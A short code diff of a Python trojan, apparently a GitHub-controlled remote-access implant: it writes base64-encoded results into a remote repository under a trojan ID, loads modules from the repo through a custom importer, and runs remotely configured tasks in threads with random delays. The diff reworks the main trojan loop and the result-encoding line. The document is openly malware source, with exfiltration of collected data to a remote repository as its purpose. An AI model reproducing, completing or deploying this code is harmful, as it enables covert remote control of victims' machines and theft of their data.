@@ -98,7 +98,7 @@ def store_module_result(data):
 
     remote_path = "data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
 
-    repo.create_file(remote_path, "Commit message", base64.b64encode(data.encode()))
+    repo.create_file(remote_path, "Commit message", base64.b64encode(data))
 
     return
 
@@ -118,15 +118,13 @@ def module_runner(module):
 # main trojan loop
 sys.meta_path = [GitImporter()]
 
-#while True:
+if task_queue.empty():
 
-    if task_queue.empty():
+    config = get_trojan_config()
 
-        config = get_trojan_config()
+    for task in config:
+        t = threading.Thread(target=module_runner, args=(task['module'],))
+        t.start()
+        time.sleep(random.randint(1, 10))
 
-        for task in config:
-            t = threading.Thread(target=module_runner, args=(task['module'],))
-            t.start()
-            time.sleep(random.randint(1, 10))
-
-    time.sleep(random.randint(10, 20))
+time.sleep(random.randint(10, 20))
